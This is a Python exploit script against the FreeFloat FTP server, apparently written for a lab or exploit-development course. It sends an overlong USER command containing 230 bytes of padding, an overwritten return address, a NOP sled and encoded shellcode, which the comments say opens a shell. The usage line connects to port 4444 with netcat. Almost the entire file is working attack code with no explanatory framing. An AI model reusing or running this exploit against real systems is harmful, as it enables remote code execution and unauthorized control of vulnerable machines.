import socket   
import sys

# usage:Establish a connection with the target using: nc 192.168.0.1 4444
#	Provide Ip address and port along python  script name.



if len(sys.argv) < 3:   #checks the number of arguments provided. if its less than 3, it outputs message and exits.
	print("please input the ip address and port number in the correct format")
	print("\t For Example: python oval.py 192.168.0.1 21")	#IP of target and port that the freefloat server is open on.
	sys.exit()
else:		#uses 1st argument as ip address and 2nd as port.
	target = sys.argv[1]
	port=int(sys.argv[2])
try:		#attempts to connect
	print("Connecting to Target...")
	soc=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	socket.setdefaulttimeout(10)
	soc.connect((target,port))
	print("Received Banner")
	print(soc.recv(1024))
except Exception as err: #if connection not succesfull, error message is printed and exits.
	print("connection Not succesfull.")
	print(err)

junk1="A"*230
eip="\x34\x2F\xB3\x7C"
nops="\x90"*16

buf =  ""
buf += "\x31\xc9\x83\xe9\xae\xe8\xff\xff\xff\xff\xc0\x5e\x81"
buf += "\x76\x0e\x41\x8c\xd2\xdd\x83\xee\xfc\xe2\xf4\xbd\x64"
buf += "\x50\xdd\x41\x8c\xb2\x54\xa4\xbd\x12\xb9\xca\xdc\xe2"
buf += "\x56\x13\x80\x59\x8f\x55\x07\xa0\xf5\x4e\x3b\x98\xfb"
buf += "\x70\x73\x7e\xe1\x20\xf0\xd0\xf1\x61\x4d\x1d\xd0\x40"
buf += "\x4b\x30\x2f\x13\xdb\x59\x8f\x51\x07\x98\xe1\xca\xc0"
buf += "\xc3\xa5\xa2\xc4\xd3\x0c\x10\x07\x8b\xfd\x40\x5f\x59"
buf += "\x94\x59\x6f\xe8\x94\xca\xb8\x59\xdc\x97\xbd\x2d\x71"
buf += "\x80\x43\xdf\xdc\x86\xb4\x32\xa8\xb7\x8f\xaf\x25\x7a"
buf += "\xf1\xf6\xa8\xa5\xd4\x59\x85\x65\x8d\x01\xbb\xca\x80"
buf += "\x99\x56\x19\x90\xd3\x0e\xca\x88\x59\xdc\x91\x05\x96"
buf += "\xf9\x65\xd7\x89\xbc\x18\xd6\x83\x22\xa1\xd3\x8d\x87"
buf += "\xca\x9e\x39\x50\x1c\xe4\xe1\xef\x41\x8c\xba\xaa\x32"
buf += "\xbe\x8d\x89\x29\xc0\xa5\xfb\x46\x73\x07\x65\xd1\x8d"
buf += "\xd2\xdd\x68\x48\x86\x8d\x29\xa5\x52\xb6\x41\x73\x07"
buf += "\xb7\x49\xd5\x82\x3f\xbc\xcc\x82\x9d\x11\xe4\x38\xd2"
buf += "\x9e\x6c\x2d\x08\xd6\xe4\xd0\xdd\x50\xd0\x5b\x3b\x2b"
buf += "\x9c\x84\x8a\x29\x4e\x09\xea\x26\x73\x07\x8a\x29\x3b"
buf += "\x3b\xe5\xbe\x73\x07\x8a\x29\xf8\x3e\xe6\xa0\x73\x07"
buf += "\x8a\xd6\xe4\xa7\xb3\x0c\xed\x2d\x08\x29\xef\xbf\xb9"
buf += "\x41\x05\x31\x8a\x16\xdb\xe3\x2b\x2b\x9e\x8b\x8b\xa3"
buf += "\x71\xb4\x1a\x05\xa8\xee\xdc\x40\x01\x96\xf9\x51\x4a"
buf += "\xd2\x99\x15\xdc\x84\x8b\x17\xca\x84\x93\x17\xda\x81"
buf += "\x8b\x29\xf5\x1e\xe2\xc7\x73\x07\x54\xa1\xc2\x84\x9b"
buf += "\xbe\xbc\xba\xd5\xc6\x91\xb2\x22\x94\x37\x22\x68\xe3"
buf += "\xda\xba\x7b\xd4\x31\x4f\x22\x94\xb0\xd4\xa1\x4b\x0c"
buf += "\x29\x3d\x34\x89\x69\x9a\x52\xfe\xbd\xb7\x41\xdf\x2d"
buf += "\x08"


junk2="C"*200


#buf is payload to be attached. this payload creates a shell on the attacker machine.

username = junk1+eip+nops+buf+junk2

try:	#attempts to send exploit
	print("Sending Exploit...")
	soc.send("USER " + username + "\r\n")
	soc.close()
except Exception as err: 	#if exploit fails, error is printed.
	print("Exploit failed.")
	print(err)
	sys.exit()







